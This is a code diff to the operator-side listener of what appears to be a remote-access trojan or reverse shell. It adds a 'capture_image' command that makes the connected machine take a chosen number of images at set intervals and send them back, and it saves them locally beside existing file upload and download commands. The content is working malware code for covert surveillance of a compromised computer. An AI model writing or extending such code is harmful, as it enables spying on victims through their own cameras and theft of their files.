@@ -29,7 +29,8 @@ class Listener:
         json_result = ""
         while True:
             try:
-                json_result += self.connection.recv(1024).decode()
+                chunk = self.connection.recv(4096).decode()
+                json_result += chunk
                 return json.loads(json_result)
             except ValueError:
                 continue
@@ -61,6 +62,15 @@ class Listener:
         except Exception as e:
             return f"[-] Exception: {e}"
 
+    def save_images(self, images):
+        if not os.path.exists("images"):
+            os.makedirs("images")
+        for i,  img_data in enumerate(images):
+            img_bytes = base64.b64decode(img_data)
+            with open(f"images/photo_{i+1}.png", "wb") as f:
+                f.write(img_bytes)
+        return f"[+] {len(images)} images saved in directory images!"
+            
     def cleanup(self):
         print("[+] Closing connection...")
         self.connection.close()
@@ -80,6 +90,11 @@ class Listener:
                 file_content = self.upload_file(command[1])
                 data = f"upload {command[1]} {file_content}"
 
+            elif command[0] == "capture_image":
+                n = int(input("Number of images: "))
+                t = int(input("Interval time in seconds[Default: 2s]: "))
+                data = f"capture_image {n} {t}"
+
             self.send(data)
             result = self.receive()
 
@@ -94,6 +109,12 @@ class Listener:
                     except Exception as e:
                         print(f"[-] Error during file/folder download: {str(e)}")
             
+            elif command[0] == "capture_image":
+                if isinstance(result, list):
+                    print(self.save_images(result))
+                else:
+                    print(result)
+                    
             else:
                 print(result)
 
